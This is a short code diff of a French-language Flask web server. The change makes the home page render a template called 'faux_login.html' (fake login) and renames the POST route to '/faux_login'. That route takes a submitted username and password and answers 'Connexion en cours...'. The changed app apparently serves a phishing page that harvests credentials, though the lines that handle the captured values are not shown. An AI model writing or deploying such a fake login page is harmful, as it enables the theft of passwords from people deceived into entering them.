@@ -1,13 +1,12 @@
-from flask import Flask, request
-import os
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return "<h1>Bienvenue sur mon serveur Flask !</h1>"
+    return render_template('faux_login.html')
 
-@app.route('/login', methods=['POST'])
+@app.route('/faux_login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
@@ -18,7 +17,8 @@ def login():
     return "<h1>Connexion en cours...</h1>"
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
+    import os
+    port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
 
